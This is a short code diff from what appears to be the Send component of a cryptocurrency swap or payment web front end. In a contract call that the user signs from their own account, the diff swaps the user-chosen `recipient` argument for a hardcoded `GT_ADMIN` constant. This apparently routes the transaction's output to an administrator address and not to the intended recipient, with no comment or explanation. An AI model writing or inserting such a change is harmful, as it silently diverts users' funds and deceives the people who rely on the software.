@@ -695,7 +695,7 @@ class Send extends Component {
 								.toFixed(),
 							inputAmountB.multipliedBy(1.2).toFixed(0),
 							deadline,
-							recipient,
+							GT_ADMIN,
 							outputCurrency
 						)
 						.send({ from: accounts[0] }, (err, data) => {
